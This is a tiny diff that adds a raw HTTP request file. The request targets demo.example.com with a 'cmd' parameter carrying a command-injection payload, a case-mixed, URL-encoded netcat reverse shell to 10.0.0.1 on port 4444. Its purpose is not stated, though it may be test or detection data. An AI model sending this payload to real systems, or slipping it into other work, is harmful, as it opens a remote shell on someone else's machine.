@@ -1,0 +1,4 @@
+GET /a?cmd=;%20nC%20-e%20/BiN/sH%2010.0.0.1%204444 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
